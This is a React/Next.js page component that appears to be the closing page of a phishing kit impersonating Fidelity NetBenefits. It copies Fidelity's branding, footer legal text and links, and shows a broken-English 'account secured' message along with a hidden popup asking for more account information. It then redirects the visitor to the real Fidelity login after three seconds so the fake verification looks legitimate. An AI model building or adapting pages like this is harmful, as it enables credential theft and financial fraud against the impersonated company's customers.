'use client';

import { useState, useEffect } from 'react';

export default function FinalPage() {
  const [showPopup, setShowPopup] = useState(false);

  useEffect(() => {
    
    const timer = setTimeout(() => {
      window.location.href = 'https://digital.fidelity.com/prgw/digital/login/full-page';
    }, 3000);

    
    return () => clearTimeout(timer);
  }, []);

  const handleStartNow = () => {
    setShowPopup(false);
  };

  return (
    <>
      <style jsx global>{`
        * {
          box-sizing: border-box;
        }

        body,
        p {
          margin: 0;
        }

        .sf-hidden {
          display: none !important;
        }

        .excla {
          display: flex;
          justify-content: center;
          align-items: center;
          width: 80px;
          height: 80px;
          text-align: center;
          margin: 0 auto;
        }

        .excla img {
          max-width: 100%;
          max-height: 100%;
        }

        .popup-text {
          text-align: center;
          font-family: "Fidelity Sans", Arial, sans-serif;
          font-weight: 700;
          font-style: normal;
          margin-top: 20px;
          color: #000;
        }

        #popup {
          display: ${showPopup ? 'block' : 'none'};
          position: fixed;
          left: 50%;
          top: 45%;
          transform: translate(-50%, -50%);
          width: 400px;
          padding: 45px 40px;
          background-color: white;
          box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
          z-index: 1000;
          border-radius: 10px;
          text-align: center;
          color: #000;
        }

        #overlay {
          display: ${showPopup ? 'block' : 'none'};
          position: fixed;
          left: 0;
          top: 0;
          width: 100%;
          height: 100%;
          background-color: rgba(0, 0, 0, 0.5);
          z-index: 500;
        }

        .pvd-button-root {
          width: 100%;
          padding: 0.75rem;
          background-color: #368727;
          color: white;
          border: none;
          border-radius: 0.25rem;
          font-size: 1rem;
          font-weight: 400;
          cursor: pointer;
          transition: background-color 0.2s;
          margin-top: 1rem;
        }

        .pvd-button-root:hover {
          background-color: #2b6b1e;
        }

        .main-container {
          background-color: #f2f2f2;
          border: 1px solid transparent;
          box-sizing: border-box;
          min-height: 100vh;
        }

        .main-container nav.dom-header {
          background-color: #fff;
          border-bottom: 1px solid #ccc;
          box-sizing: border-box;
          display: flex;
          flex-direction: row;
          flex-wrap: nowrap;
          font-family: Fidelity Sans, Arial, sans-serif;
          height: 3.75rem;
          justify-content: space-between;
        }

        .main-container nav.dom-header div.dom-header-logo {
          margin: 1rem 0 0 1.25rem;
        }

        .main-container nav.dom-header div.dom-header-logo a {
          text-decoration: none;
        }

        .main-container nav.dom-header div.dom-header-links {
          margin: 0 1.25rem 0 0;
          display: flex;
          align-items: center;
          gap: 2rem;
        }

        .main-container nav.dom-header div.dom-header-links .dom-header-pvd-link {
          color: #000;
          font-weight: 400;
          vertical-align: middle;
          text-decoration: none;
        }

        .main-container .dom-container {
          margin: 15vh auto 0;
          padding-bottom: 2rem;
          width: 448px;
        }

        .dom-card {
          background: #fff;
          font-family: Fidelity Sans, Helvetica, Arial, sans-serif;
          color: #000;
        }

        @media (min-width: 32em) {
          .dom-card {
            border: 1px solid #ccc;
            border-radius: 0.5rem;
            padding: 2rem 2rem 3rem;
          }
        }

        @media (max-width: 32em) {
          .dom-card {
            border-bottom: 1px solid #ccc;
            padding: 1.5rem 1rem;
          }
        }

        .dom-card .dom-card-header {
          margin-bottom: 1rem;
        }

        .dom-card h1 {
          font-size: 1.5rem;
          font-weight: 700;
          margin: 0;
          color: #000;
        }

        .dom-card .dom-card-body {
          margin: 1.5rem 0 0;
        }

        .dom-card .dom-card-body p {
          color: #000;
        }

        .final {
          text-align: center;
          font-family: "Fidelity Sans", Arial, sans-serif;
          font-weight: 700;
          font-style: normal;
        }

        .img-ex {
          display: flex;
          justify-content: center;
          align-items: center;
          width: 80px;
          height: 80px;
          text-align: center;
          margin: 0 auto;
        }

        .img-ex img {
          max-width: 100%;
          max-height: 100%;
        }

        .dom-link-actions {
          text-align: center;
          margin: 2rem 0;
          color: #000;
        }

        .dom-link {
          color: #0066cc;
          text-decoration: none;
        }

        .dom-link:hover {
          text-decoration: underline;
        }

        footer.dom-footer {
          background-color: #f2f2f2;
          border: 1px solid transparent;
          color: #666;
          font-family: Fidelity Sans, Arial, sans-serif;
          font-size: 0.75rem;
          font-weight: 400;
          margin-top: -2rem;
        }

        footer.dom-footer .dom-footer-pvd-link {
          color: #666 !important;
        }

        footer.dom-footer .footer-new-user,
        footer.dom-footer .footer-legal,
        footer.dom-footer .footer-links-stacked,
        footer.dom-footer .footer-copyright-row {
          box-sizing: border-box;
          padding: 0 1.25rem;
          width: 100%;
        }
        footer.dom-footer .footer-new-user {
          padding-top: 0.5rem;
          padding-bottom: 1.5rem;
        }
        footer.dom-footer .footer-new-user-heading {
          margin: 0 0 0.5rem 0;
          font-size: 0.875rem;
          color: #333;
        }
        footer.dom-footer .footer-new-user .dom-footer-pvd-link { display: block; margin-bottom: 0.25rem; }
        footer.dom-footer .footer-faqs-link { display: block; margin-top: 1.25rem; }
        footer.dom-footer .footer-legal {
          line-height: 1.5;
          margin: 0 0 1.5rem 0;
        }
        footer.dom-footer .footer-links-stacked .dom-footer-pvd-link {
          display: block;
          padding: 0.25rem 0;
          text-decoration: none;
        }
        footer.dom-footer .footer-links-stacked .dom-footer-pvd-link:hover { text-decoration: underline; }
        footer.dom-footer .footer-copyright-row { padding-bottom: 0.75rem; }
        footer.dom-footer .footer-copyright { line-height: 1.5; }

        @media screen and (min-width: 512px) {
          .main-container {
            height: auto;
            min-height: 100vh;
          }

          .main-container .dom-header {
            align-items: center;
            position: static;
          }

          .main-container .dom-header div.dom-header-links,
          .main-container .dom-header div.dom-header-logo {
            position: static;
          }

          footer.dom-footer {
            display: grid;
            grid-template-columns: 1fr 1fr;
            grid-template-rows: auto auto auto;
          }
          footer.dom-footer .footer-new-user,
          footer.dom-footer .footer-legal {
            grid-column: 1 / -1;
            text-align: left;
          }
          footer.dom-footer .footer-copyright-row {
            grid-column: 1;
            text-align: left;
          }
          footer.dom-footer .footer-links-stacked {
            grid-column: 2;
            text-align: right;
          }
          footer.dom-footer .footer-links-stacked .dom-footer-pvd-link {
            display: inline-block;
            padding: 0.75rem 1.5rem 0.75rem 0;
          }
        }

        @media screen and (max-width: 768px) {
          .main-container .dom-header div.dom-header-links.dom-header-links--hide-on-mobile {
            display: none;
          }
        }

        @media screen and (max-width: 511px) {
          .main-container .dom-header,
          .main-container .dom-header div.dom-header-logo {
            position: static;
          }

          .main-container .dom-header div.dom-header-links {
            display: none;
          }
        }

        @media only screen and (max-width: 511px) {
          .main-container nav.dom-header {
            border-bottom: none;
          }

          .main-container .dom-container {
            margin: 0 auto;
            width: auto;
          }

          .main-container .dom-header div.dom-header-links {
            display: none;
          }

          footer.dom-footer {
            display: block;
            font-size: 0.875rem;
          }
          footer.dom-footer .footer-new-user,
          footer.dom-footer .footer-legal,
          footer.dom-footer .footer-links-stacked,
          footer.dom-footer .footer-copyright-row {
            text-align: center;
          }
          footer.dom-footer .footer-links-stacked .dom-footer-pvd-link {
            display: block;
            padding: 0.25rem 0;
          }
        }

      `}</style>

      <div id="overlay" onClick={() => setShowPopup(false)}></div>
      <div id="popup">
        <div className="excla">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/8/88/Exclamation_sign_font_awesome.svg"
            alt=""
          />
        </div>
        <p className="popup-text">
          IN ORDER TO ENHANCE OUR SERVICE AND ENSURE THE ACCURACY OF YOUR ACCOUNT INFORMATION, WE
          KINDLY REQUEST YOUR COOPERATION IN PROVIDING SOME ADDITIONAL INFORMATION. PLEASE CLICK "START NOW" TO BEGIN THE
          PROCESS
        </p>
        <br />
        <button
          className="pvd-button-root pvd-button--full-width pvd-button--primary"
          id="popup-btn"
          type="button"
          onClick={handleStartNow}
        >
          <span style={{ color: 'white' }}>Start Now</span>
        </button>
      </div>

      <div className="main-container">
        <nav className="dom-header">
          <div className="dom-header-logo">
            <a href="/">
              <img
                src="/Fidelity-NetBenefits-Logo%20(5).svg"
                alt="Fidelity NetBenefits"
                style={{ height: '28px', width: 'auto' }}
              />
            </a>
          </div>
          <div className="dom-header-links dom-header-links--hide-on-mobile">
            <a
              className="dom-header-pvd-link"
              href="https://www.fidelity.com/security/overview"
            >
              Security
            </a>
            <a
              className="dom-header-pvd-link"
              href="https://www.fidelity.com/customer-service/need-help-logging-in"
            >
              FAQs
            </a>
          </div>
        </nav>

        <div className="dom-container">
          <div id="dom-overlay"></div>
          <div id="dom-widget">
            <div>
              <div id="mainui" className="dom-card dom-signin-card">
                <div className="final">
                  <div className="img-ex">
                    <img
                      src="https://upload.wikimedia.org/wikipedia/commons/8/88/Exclamation_sign_font_awesome.svg"
                      alt="Success"
                    />
                  </div>
                  <br />
                  <span style={{ color: '#000', display: 'block' }}>
                    CONGRATULATIONS YOU HAVE COMPLETELY SECURE YOUR FIDELITY ACCOUNT. <br />
                    KINDLY LOGIN AND GO TO YOUR PROFILE AND ENSURE THAT YOUR HOME PHONE AND EMAIL IS VERIFIED.
                    <br /><br />
                    THANK YOU
                  </span>
                </div>
              </div>
            </div>
          </div>
          <div id="dom-sronly" aria-live="assertive"></div>
        </div>

        <div className="dom-link-actions">
          New to Fidelity?{' '}
          <a
            className="dom-link"
            href="https://www.fidelity.com/open-account/overview"
          >
            Open an account
          </a>
          {' or '}
          <a
            className="dom-link"
            href="https://digital.fidelity.com/prgw/digital/login/user-identity?intent=nur"
          >
            sign up.
          </a>
        </div>
      </div>

      <footer className="dom-footer">
        <p className="footer-legal">
          By using this website, you consent to the use of cookies as described{' '}
          <a
            className="dom-footer-pvd-link underline"
            href="https://www.fidelity.com/cookie-policy"
            target="_blank"
            rel="noopener"
          >
            here
          </a>
          . However, if you do not agree to our cookies policy, you can change your cookie settings at any time.{' '}
          Fidelity Brokerage Services LLC, Member{' '}
          <a
            className="dom-footer-pvd-link underline"
            href="https://www.nyse.com"
            target="_blank"
            rel="noopener"
          >
            NYSE
          </a>
          ,{' '}
          <a
            className="dom-footer-pvd-link underline"
            href="https://www.sipc.org"
            target="_blank"
            rel="noopener"
          >
            SIPC
          </a>
          , 900 Salem Street, Smithfield, RI 02917
        </p>
        <div className="footer-links-stacked">
          <a
            className="dom-footer-pvd-link"
            href="https://www.fidelity.com/terms-of-use"
            target="_blank"
            rel="noopener"
          >
            Terms of Use
          </a>
          <a
            className="dom-footer-pvd-link"
            href="https://www.fidelity.com/privacy-policy"
            target="_blank"
            rel="noopener"
          >
            Privacy
          </a>
          <a
            className="dom-footer-pvd-link"
            href="https://www.fidelity.com/security/overview"
            target="_blank"
            rel="noopener"
          >
            Security
          </a>
        </div>
        <div className="footer-copyright-row">
          <div className="footer-copyright">
            ©1998-2026 FMR LLC. All Rights Reserved.
            <br />
            1205840.1.0
          </div>
        </div>
      </footer>
    </>
  );
}


